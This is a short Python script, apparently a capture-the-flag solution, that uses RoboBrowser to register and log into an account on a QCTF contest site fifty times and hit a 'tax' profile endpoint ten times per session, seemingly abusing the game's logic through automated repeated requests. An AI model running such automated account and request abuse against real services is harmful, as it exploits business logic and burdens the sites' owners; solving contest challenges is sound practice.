from robobrowser import RoboBrowser

tax = 'https://kingsandslaves.contest.qctf.ru/profile/ru/tax'
reg = 'https://kingsandslaves.contest.qctf.ru/auth/register'
log = 'https://kingsandslaves.contest.qctf.ru/'

for j in range(0,50):
    browser = RoboBrowser(history=True)
    browser.open(reg)
    form = browser.get_form(action='')
    form["username"] =  'eeeeee'
    form["password"] =  'eeeeee'
    form['password2'] = 'eeeeee'

    browser.submit_form(form)
    browser.open(log)
    form = browser.get_form(action='/')
    form['username'] = 'eeeeee'
    form['password'] = 'eeeeee'
    browser.submit_form(form)

    for i in range(0,10): browser.open(tax)
